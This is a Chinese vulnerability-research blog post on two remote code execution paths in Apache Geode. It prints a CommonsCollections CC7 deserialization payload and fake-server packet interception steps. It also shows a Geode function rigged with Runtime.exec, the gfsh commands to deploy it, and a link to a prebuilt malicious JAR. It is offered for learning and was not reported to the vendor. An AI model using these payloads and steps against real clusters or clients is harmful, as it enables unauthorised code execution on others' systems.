---
title: Apache Geode审计现场实战 - 漏洞链构造/完结归档
published: true
---

这段时间笔者审计在此之前遇到的一个 Apache 中间件 Apache Geode，并且会在这里实时开源自己审计出来的 RCE 漏洞，供读者学习  

注意，本篇文章不遵循 CC 协议，其内容均为 leeya_bug 所有，禁止转载

<table style="border:1px solid #2bbc8a;border-collapse: collapse;" border="1">
  <tr><td colspan="2">
    当前由 leeya_bug 发现的 Apache Geode 漏洞
  </td></tr>
  <tr>
    <td>
        AGVL-01: Apache Geode 反序列化 RCE 漏洞
    </td>
    <td>
        由于客户端、节点在初始化 Handshake 时接收了来自集群的数据流但不正确地将其处理，攻击者可在此过程中伪造集群/中间人攻击，将在客户端触发反序列化漏洞并最终导致远程命令执行漏洞
    </td>
  </tr>
  <tr>
    <td>
        AGVL-02: Apache Geode 集群未授权 RCE 漏洞
    </td>
    <td>
        由于集群可由任意工程端、节点连接并上传特定 JAR 部署函数，攻击者可将 Payload 植入到 JAR 并上传至集群，而后调用该 JAR，在集群中触发远程命令执行漏洞
        &nbsp;
    </td>
  </tr>
</table>
<!--
<table style="border:1px solid #2bbc8a;border-collapse: collapse" border="1">
  <tr><td>
    目录跳转
  </td></tr>
  <tr><td>
    <a href="#漏洞链-1">漏洞链 1: CacheServerHelper.deserialize(Args)</a>
  </td></tr>
  <tr><td>
    <a href="#漏洞链-2">漏洞链 2: 基于漏洞链1直接到达用户 interface</a>
  </td></tr>
  <tr><td>
    <a href="#漏洞agvl-01">AGVL-01漏洞: Apache Geode 客户端反序列化RCE漏洞(基于漏洞链2)</a>
  </td></tr>
  <tr><td>
    <a href="#漏洞链-3">漏洞链 3: </a>
  </td></tr>
  <tr><td>
    <a href="#一些个人建议">一些个人建议</a>
  </td></tr>
</table>
-->

| 目录跳转 |
|--------|
| [Apache Geode简介及背景介绍](#中间件简介及背景介绍) |
| [漏洞链 1: CacheServerHelper.deserialize(Args)](#漏洞链-1) |
| [漏洞链 2: 基于漏洞链1直达用户 interface](#漏洞链-2) |
| [AGVL-01漏洞: Apache Geode 反序列化 RCE 漏洞(基于漏洞链1、漏洞链2)](#漏洞agvl-01) |
| [漏洞链 3: 构造恶意 JAR ](#漏洞链-3) |
| [AGVL-02漏洞: Apache Geode 集群未授权 RCE 漏洞(基于漏洞链3)](#漏洞agvl-02) |
| [一些个人意见](#一些个人意见) |

# [](#header-31)中间件简介及背景介绍

Apache Geode 是一个基于 JVM 的 NoSQL 分布式数据处理平台，提供实时的、一致的、贯穿整个云架构地访问数据关键型应用，他的特点是强一致性和高实时性、对数据结构有更强的表达能力，能描述部分逻辑表达的内存数据库  

Apache Geode 的官方网站：[https://geode.apache.org/](https://geode.apache.org/)  
Apache Geode 的官方仓库：[https://github.com/apache/geode](https://github.com/apache/geode)  

在漏洞构造过程，笔者将会省略一些无关紧要的内容，尽量简述，更多细节请读者私下自行测试. 另外，笔者将会以调用链(以下称漏洞链)的形式分步拆解漏洞调用路径，更便于分析

# [](#header-31)漏洞链 1:

笔者注意到 org.apache.geode.internal.cache.tier.sockets.CacheServerHelper 被该中间件广泛使用在 client 和 server 的 Cache 交互中的处理文件或对象反序列化场景，而该对象关键三个方法如下所示  

```java
public class CacheServerHelper {
    public static Object deserialize(byte[] blob) throws IOException, ClassNotFoundException {
        return deserialize(blob, false);
    }

    public static Object deserialize(byte[] blob, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob);
    }

    public static Object deserialize(byte[] blob, KnownVersion version, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob, version, (ByteArrayDataInput)null);
    }
}

```

这几个重载都将数据引到 unzip 或 BlobHelper.deserializeBlob 中，虽然 unzip 在解压后直接能够触发反序列化，但该方法在源代码中不会被调用. 因此这里笔者直接跟进 BlobHelper.deserializeBlob 即 org.apache.geode.internal.util.BlobHelper.basicReadObject  

中间调用路径只是在将数据类型转化和简单逻辑处理，笔者认为有省略的必要，如果有需要学习的读者可以自行下来研究  

![avatar](/image/2024-06-01-6.png)  

中间调用路径省略，而后经过逐层调用后直接来到了 org.apache.geode.internal.InternalDataSerializer.basicReadObject，此时由用户输入而来的参数 in 的类型为 PdxInputStream 既继承了 InputStream 又实现了 DataInput

```java
public class PdxInputStream extends ImmutableByteBufferInputStream
```

继续跟进 basicReadObject，其方法流程分析:  
1. 该方法首先先调用 DscodeHelper.toDSCODE 获取 header 判断文件类型后，根据类型进行解析操作. 在此直接取出 DSCODE 枚举类然后观察变量映射即可，笔者不赘述. 观察得知 44 为 SERIALIZABLE  

2. 继续如下 switch (headerDSCode) 流程，笔者发现当 header 等于 SERIALIZABLE 时，能直接进入 readSerializable 然后调用 readObject  

basicReadObject 关键代码解析如下所示

```java
//源码分析
public abstract class InternalDataSerializer extends DataSerializer {
    public static Object basicReadObject(DataInput in) throws IOException, ClassNotFoundException {
        checkIn(in);
        byte header = in.readByte(); //获取 header
        DSCODE headerDSCode = DscodeHelper.toDSCODE(header); //获取 header 映射值 
        if (logger.isTraceEnabled(LogMarker.SERIALIZER_VERBOSE)) {
            logger.trace(LogMarker.SERIALIZER_VERBOSE, "basicReadObject: header={}", header);
        }

        if (headerDSCode == null) {
            throw new IOException("Unknown header byte: " + header);
        } else {
            switch (headerDSCode) {
                case DS_FIXED_ID_BYTE:
                    return dsfidFactory.create(in.readByte(), in);
                case DS_FIXED_ID_SHORT:
                    return dsfidFactory.create(in.readShort(), in);
                ...[省略几十个cases]...

                case SERIALIZABLE:
                    return readSerializable(in); //继续跟进，调用 InputStream.readObject

                ...[省略几十个cases]...
                default:
                    throw new IOException("Unknown header byte: " + header);
            }
        }
    }
}
```

继续跟进 readSerializable，逻辑是如果 in 继承 InputStream 了就直接强转为 InputStream，没有继承 InputStream 就写个 InputStream 的继承然后写个闭包的override read 方法(这个地方很重要，因为后续流很可能只实现了 DataInput)，如下所示  

```java
//源码分析
public abstract class InternalDataSerializer extends DataSerializer {
    private static Serializable readSerializable(final DataInput in) throws IOException, ClassNotFoundException {
        boolean isDebugEnabled_SERIALIZER = logger.isTraceEnabled(LogMarker.SERIALIZER_VERBOSE);
        Serializable serializableResult;
        //这里是 PdxInputStream 因此不进入
        if (in instanceof DSObjectInputStream) {
            serializableResult = (Serializable)((DSObjectInputStream)in).readObject();
        } else {
            InputStream stream;
            if (in instanceof InputStream) {
                stream = (InputStream)in;
            } else {
                //继承并 override read
                stream = new InputStream() {
                    public int read() throws IOException {
                        try {
                            return in.readUnsignedByte();
                        } catch (EOFException var2) {
                            return -1;
                        }
                    }
                };
            }
            //强转为 DSObjectInputStream
            ObjectInput ois = new DSObjectInputStream(stream);
            serializationFilter.setFilterOn((ObjectInputStream)ois);
            //这里虽然 DSObjectInputStream 是其子类，但无其他判断故跳过 
            if (stream instanceof VersionedDataStream) {
                KnownVersion v = ((VersionedDataStream)stream).getVersion();
                if (KnownVersion.CURRENT != v && v != null) {
                    ois = new VersionedObjectInput((ObjectInput)ois, v);
                }
            }
            //成功 readObject 反序列化
            serializableResult = (Serializable)((ObjectInput)ois).readObject();
            ...[下面的代码省略]..
        }
        ...[下面的代码省略]..
    }
}

```
接下来构造 Payload  
Payload 就很简单了，构造流程只需要将 ObjectInputStream.writeObject 后的反序列化链字节流前置一个 44 字节即可  
这里读者借用了 CC7 链来充当反序列化链，有需要的读者可以自己构造链子  

```java
//Payload
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.geode.cache.Region;
import org.apache.geode.cache.client.*;
import org.apache.geode.internal.cache.tier.sockets.CacheServerHelper;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class Geode {

    public Object CC7() throws NoSuchFieldException, IllegalAccessException {
        //构造 CC7 链并返回
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        Map<Object, Object> map1 = new HashMap<>();
        Map<Object, Object> map2 = new HashMap<>();
        Map<Object, Object> lazymap1 = LazyMap.decorate(map1, chainedTransformer);
        Map<Object, Object> lazymap2 = LazyMap.decorate(map2, chainedTransformer);
        lazymap1.put("yy", 1);
        lazymap2.put("zZ",1);
        Hashtable hashtable = new Hashtable<>();
        hashtable.put(lazymap1, 1);
        hashtable.put(lazymap2,2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, transformers);
        lazymap2.remove("yy");
        return hashtable;
    }

    public Geode() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //构造 Payload
        ByteArrayOutputStream by = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(by);
        oos.writeObject(CC7());
        byte[] code1 = by.toByteArray();

        byte[] code3 = new byte[code1.length + 4];
        for (int i = 0; i < code1.length; i++) {
            code3[i + 1] = code1[i];
        }
        code3[0] = 44;
        code3[code3.length - 1] = 1;
        code3[code3.length - 2] = 42;
        code3[code3.length - 3] = -23;

        CacheServerHelper.deserialize(code3);
    }
}
```

# [](#header-31)漏洞链 2:

在漏洞链2的构造过程中需要连接服务器并动态调试，因此笔者使用了IP为 172.245.82.84 的笔者合法购买的服务器，谁想打谁打吧反正就一个22端口

在 172.245.82.84 装上 jdk1.8 运行 gfsh 命令终端后，输入以下几行命令 bind ip 并启动 Geode 服务端并且初始化 locator、server、region

```bash
start locator --bind-address=172.245.82.84 --name=locator_1
start server --bind-address=172.245.82.84 --name=server_1
create region --name=hello --type=REPLICATE_PERSISTENT
```

接下来在工程端中构造连接服务端的 java 代码，如下代码所示

```java
import org.apache.geode.cache.Region;
import org.apache.geode.cache.client.ClientCache;
import org.apache.geode.cache.client.ClientCacheFactory;
import org.apache.geode.cache.client.ClientRegionShortcut;

public class Main {

    public static void main(String[] args) throws Exception {
        try {
            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).create();
            Region<String, String> region = cache.<String, String>createClientRegionFactory(ClientRegionShortcut.PROXY).create("hello");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

在与服务端建立连接前，启动 Wireshark 来监测流量. 由于该流量为基于 TCP 的自建协议(以下简称 "Geode 协议")，笔者直接过滤掉其他非 Geode 协议数据然后输入过滤语句`ip.dst == 172.245.82.84 || ip.src == 172.245.82.84`(172.245.82.84 是笔者本人服务端IP)开始监测应用流量

而后运行代码，观测先前笔者在漏洞链1中提到的 InternalDataSerializer.basicReadObject 中的栈变量，在第一次工程端与服务端通信并调用 InternalDataSerializer.basicReadObject 时，我们会发现如下所示 in 中的 bytearr 值全为0. 不过先别急，这应该是 buffer 预留信息

![avatar](/image/2024-06-01-1.png)  

在重复地 Resume 了几次后，笔者终于发现这里有了非 0 的输入流  
该输入流的类型为 ByteArrayDataInput 如下所示  

![avatar](/image/2024-06-01-2.png)  

继续跟进该输入流，发现还是到了利用链1中 switch (headerDSCode) 那一步，如果此时构造该流的头部一字节值为 44 并植入恶意 Payload，那就会顺理成章地反序列化 RCE

![avatar](/image/2024-06-01-5.png)  
`*工厂create`

接下来总结该数据的规律:  
经过笔者多次反复重启 + Resume 观测后发现该流的 header 固定为 015C04AC ，且长度普遍在 80 - 100 的区间范围内.   
接下来打开 WireShark 分析，多次运行并抓包看看是否能找到对应流量  

找到最近监测的几条来自 172.245.82.84 的流量，终于发现某条 Geode 协议流量的 Data 数据段跟我们刚刚观测到的流量特征一模一样，如下红线处所示  

![avatar](/image/2024-06-01-3.png)  

而依据是什么？我们直接来到 org.apache.geode.cache.client.internal，观察 ConnectionConnector，关键在类型为 ConnectionImpl 的 connection 实例调用的 connect 方法，如下所示

```java
//源码分析
public class ConnectionConnector {
    public ConnectionImpl connectClientToServer(ServerLocation location, boolean forQueue) throws IOException {
        //初始化 connection
        ConnectionImpl connection = null;
        boolean initialized = false;

        try {
            //获取服务器连接
            connection = this.getConnection(this.distributedSystem);
            //准备握手
            ClientSideHandshake connHandShake = this.getClientSideHandshake(this.handshake);
            //跟进 connetion.connect
            connection.connect(this.endpointManager, location, connHandShake, this.socketBufferSize, this.handshakeTimeout, this.readTimeout, this.getCommMode(forQueue), this.gatewaySender, this.socketCreator, this.socketFactory);
        }
        ...[省略几百行代码]...
    }
}
```

connection.connect 中会调用 handshakeWithServer. 在多次握手后服务器将会发送 Member 至工程端，工程端在 readServerMember 方法中使用存在作为漏洞链1的一部分的反序列化函数直接读取 Member，是导致反序列化漏洞的直接原因

```java
//源码分析
public class ClientSideHandshakeImpl extends Handshake implements ClientSideHandshake {
    public ServerQueueStatus handshakeWithServer(Connection conn, ServerLocation location, CommunicationMode communicationMode) throws IOException, AuthenticationRequiredException, AuthenticationFailedException, ServerRefusedConnectionException {...}
}
```

```java
//源码分析
public class ClientSideHandshakeImpl extends Handshake implements ClientSideHandshake {
    private InternalDistributedMember readServerMember(DataInputStream p_dis) throws IOException {
        //获取 InputStream 获取 byte[]
        byte[] memberBytes = DataSerializer.readByteArray(p_dis);
        KnownVersion v = StaticSerialization.getVersionForDataStreamOrNull(p_dis);
        //Byte[] 对象化
        ByteArrayDataInput dis = new ByteArrayDataInput(memberBytes, v);

        try {
            //DataSerilizer 读取 Server Member，进入漏洞链1
            return (InternalDistributedMember)DataSerializer.readObject(dis);
        }
        ...[省略几百行代码]...
            
    }
}
```

这样直接伪造一个服务端，在特定情况下更改 Geode 协议的 Data 为漏洞链1的 Payload 就行了，下面开始漏洞复现

# [](#header-31)漏洞agvl-01:
# [](#header-31)Apache Geode 反序列化 RCE 漏洞(基于漏洞链1、漏洞链2)

接下来的大致流程是构造一个伪服务端，截取发送到工程端的 Geode 协议流量后观察其 Data 开头是否为 015C04AC，若是，则将 Data 替换为漏洞链1的基于 CC7 链的 Payload  
上面这段话看似简单，实际上要实现并非简单. 基于 TCP 协议的 Geode 协议并非类似于应用层 HTTP(s) 这种协议，想拦就拦想改就改. 按照以往流程，笔者需要在 Linux 服务器上写个 hook 函数直接拦截 TCP 流量并观察其内容  

不过笔者又不想写 hook，只能找到了一个 Scapy + netfilterqueue 已经替用户封装好了的替代方案，通过 iptables 重定向流量导入 netfilterqueue 后再编写 Python 代码从 netfilterqueue 中抓取 TCP 流量

首先在伪服务端安装 netfilterqueue 在 CentOS7 操作系统上的依赖，命令如下所示

```bash
yum install python3-devel
yum install libnetfilter_queue
yum install libnfnetlink-devel
yum install libnetfilter_queue-devel
```

更改伪服务端 iptables，如下所示. 请注意，这里一定要将机器接显或者使用云厂商 VNC 连接！

```bash
#更改 iptables 配置
#注意在更改前一定要有 VNC 环境或者本地服务器！否则远程连接直接断开！
iptables -A INPUT -j NFQUEUE --queue-num 0
iptables -A OUTPUT -j NFQUEUE --queue-num 0
```

在使用 pip 安装完毕 netfilterqueue python 接口 package 后，在伪服务端运行以下代码

```py
#写 TCP 抓包改包 hook 并运行
from scapy.all import *
import netfilterqueue

def p(data):
  pkt = IP(data.get_payload())
  #抓 172.245.82.84 发出去的包
  if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[IP].src=='172.245.82.84':
      #...[请读者自行配置和思考该部分内容]...

  data.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, p)
queue.run()
```

在所有的一切配置完毕后，我们的伪服务端就已经构造完毕了.  
接下来运行工程端连接 172.245.82.84 时直接弹计算器出来，证明此处存在命令执行漏洞  

![avatar](/image/2024-06-01-4.png)  

<!--
至于为什么该漏洞编号为 AGVL-01 呢？是因为 AGVL 是 Apache Geode Vulnerability by leeya_bug 的简称
-->

# [](#header-31)漏洞链 3:

笔者将利用集群能够上传 JAR 并解析其中的函数的特性，构造一个包含 RCE Payload 的 JAR 并在后续漏洞验证阶段上传. 首先读者可以阅读一下 Apache Geode 官方文档、笔者以下给出的 Youtube 视频示例，来初步了解下 Apache Geode 的集群函数部署方式及解析特性  

[Geode官方文档 如何构建一个Geode函数并将其部署到集群中](https://geode.apache.org/docs/guide/114/configuring/cluster_config/deploying_application_jars.html)

[Youtube 集群函数构造、部署示例](https://www.youtube.com/watch?v=ZzU3JO0DsTs)

用户可以通过手动上传一个按照 Geode 部署规则打包的 JAR 包的方式在集群上部署自己的函数，该函数的必须 implement org.apache.geode.cache.execute.Function 并且实现 execute 和 getId 方法，getId 方法返回值将作为 Function 的唯一标识符，如下所示  

```java
public class TestFunction implements Function {
  public static final String ID;

  @Override
  public String getId() {
    return "leeya_bug"
  }

  @Override
  public void execute(FunctionContext context) {

  }
}
```
`*Function接口的一个实现`

这里笔者想提醒一下各位读者，请千万不要自己构造 JAR 包，若执意自己构造你会发现自己打包的 JAR 包由于各种原因根本无法兼容集群.

为了避免部署麻烦直接使用官方 Geode example 来改就行. 接下来笔者也将会用 Geode-example 来为各位读者展示 JAR 包构造流程及 Payload 注入. 首先输入以下命令从 Github 克隆 Geode-example 到本地

```bash
git clone https://github.com/apache/geode-examples
```

克隆完毕后，笔者稍微介绍下 geode-examples 必要的项目结构

1. 位于 `geode-examples/functions` 的项目即为示例 JAR 项目  

2. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/PrimeNumber.java` 中的 PrimeNumber implements Function 类即为集群将会被识别到并且加载的函数类，我们要将 Payload 注入该恶意类中并且将其编译为 JAR 植入集群  

3. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/Example.java` 中的 main 方法即为我们的客户端入口，客户端将从此处调用集群中的恶意类并在集群上触发命令执行漏洞  

植入 Payload： 
1. 首先打开 PrimeNumber.java，在 execute 函数的 58 行添加我们的恶意测试 Payload，该 Payload 会在根目录创建个名称为 hacked.txt 的文件以验证命令执行漏洞  

    未植入前

    ```java
    public class PrimeNumber implements Function {
        public void execute(FunctionContext context) {
            ...[省略代码]...
            Collections.sort(primes);

            context.getResultSender().lastResult(primes);
        }
    }
    ```

    植入后

    ```java
    public class PrimeNumber implements Function {
        public void execute(FunctionContext context) {
            ...[省略代码]...
            Collections.sort(primes);
            //笔者恶意代码
            try {
                Runtime.getRuntime().exec("touch /hacked.txt");
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

            context.getResultSender().lastResult(primes);
        }
    }
    ```

2. 而后，修改 Example.java 中的第 35 行的 IP 地址为远程集群 IP: 172.245.82.84 (这里是我个人 IP，读者请按自己需要修改)
    ![avatar](/image/2024-06-01-12.png)  

3. 植入完毕后，进入`geode-examples/functions`，输入命令 `../gradlew build`   启动 gralew 打包(请注意，在此处 jdk1.8 环境是必要的，请先安装 jdk1.8 再执行以下步骤):  

    Tip1: 若提示格式错误，请使用命令 `../gradlew spotlessApply` 来重整格式  

    Tip2: 若读者无法将其编译为 JAR 或编译失败(编译 JAR 的错误率极高)，可点击以下链接下载读者预先在 jdk1.8 环境下编译好的 functions.jar  
    [(by leeya_bug)functions.jar](/assets/functions.jar)  
    

4. 打包完毕后，文件 `geode-examples/functions/build/libs/functions.jar` 即为我们即将植入集群的恶意类 JAR，稍后我们会使用 `../gradlew run` 来调用集群中植入的 JAR. 需要注意的是，读者可自行在任意 jdk 环境下构造客户端与集群通信，如下所示，并非一定要使用 `../gradlew run` 命令

    ```java
    import java.util.HashSet;
    import java.util.List;
    import java.util.Set;
    import java.util.stream.IntStream;

    import org.apache.geode.cache.Region;
    import org.apache.geode.cache.client.*;
    import org.apache.geode.cache.execute.*;

    public class Example {
        private int maximum;
        public Example() { this(100); }
        public Example(int maximum) { this.maximum = maximum; }

        public static void main(String[] args) {
            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).set("log-level", "WARN").create();
            Region<Integer, String> region = cache.<Integer, String>createClientRegionFactory(ClientRegionShortcut.CACHING_PROXY).create("example-region");
            Execution execution = FunctionService.onRegion(region);
            new Example().getPrimes(region, execution);
            cache.close();
        }

        public Set<Integer> getPrimes(Region<Integer, String> region, Execution execution) {
            Set<Integer> primes = new HashSet<>();
            for (Integer key : (Iterable<Integer>) () -> IntStream.rangeClosed(1, maximum).iterator()) {
                region.put(key, key.toString());
            }
            ResultCollector<Integer, List> results = execution.execute(PrimeNumber.ID);
            primes.addAll(results.getResult());
            System.out.println("The primes in the range from 1 to " + maximum + " are:\n" + primes);
            return primes;
        }
    }
    ```

# [](#header-31)漏洞agvl-02:
# [](#header-33)Apache Geode 集群未授权 RCE 漏洞(基于漏洞链3)

现在轮到 172.245.82.84 变成受害人了，我们将刚刚漏洞链3打包完毕的 JAR 部署到 12.245.82.84 中并调用该 JAR 中的恶意 Payload

1. 接下来我们在客户端的 gfsh 终端中使用命令 `connect --locator=172.245.82.84[10334]` 连接 172.245.82.84

    ![avatar](/image/2024-06-01-7.png)  

    连接完毕后，依次输入以下命令创建 region 并植入 JAR

    `create region --name=example-region --type=REPLICATE`  
    `describe region --name=example-region`  
    `deploy --jar={存放路径}/functions.jar`  

    在客户端上输入以上命令时，请完全忽略回显，由于一些集群底层架构问题，回显是错误的，一切以集群实际情况为准.  

    Tip: 第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互，第 3 条命令的作用是将 functions.jar 部署到集群中

2. 进入 `geode-examples/functions`，输入以下命令启动客户端调用远程函数  

    `../gradlew run`

    若出现以下回显，则说明一切正常

    ![avatar](/image/2024-06-01-9.png)  

3. 登录集群，发现根目录 `/` 下果然存在文件 `/hacked.txt`，证明攻击者可将 Payload 植入到 JAR 并上传至集群，而后远程调用该 JAR，在集群中触发命令执行漏洞  

    ![avatar](/image/2024-06-01-11.png)  


# [](#header-31)一些个人意见

在Apache Geode中，有那么一些小特性：

1. Apache Geode 创建的 server、locator 绑定的IP必须与用户在同一子网下，使用穿透、端口映射等方法均完全无法正常访问，同理对于 docker 镜像部署几乎属于 0 支持
2. 官方文档缺斤少两：无论是中文的文档还是英文的文档，都是缺斤少两. 很多函数调用细节都是笔者猜想出来的，尤其是在 jmx 访问处，笔者
3. 对于个人用户的支持性极差：几乎只适合企业级场景，在低于 2G 内存下部署将会自动崩溃
4. 错误处理极为奇葩：笔者在动态调试过程中只收到过一类正确的 Exception，当然是笔者自己忘记 docker 映射端口的原因，后续收到的 Exceptions 几乎都是无脑 throw 底部栈

以上漏洞笔者还未提交至任何漏洞平台，仅在此公开，原因如下：

1. Apache Geode 部署流程较为棘手，搞坏了我两台服务器真机(不包括 docker)的配置环境
2. 笔者学业繁忙，某些漏洞若想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此无任何深入研究  Geode 协议并将其利益化的必要

如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi)  

如果有想部署复现、学习的读者可以联系笔者参考，有想拿去交 CVE 的就交吧就当笔者送你的

-----

于 2024 6 9日更新，笔者目标已经完成，后续如无必要将不会再对该资产做出进一步审计和处理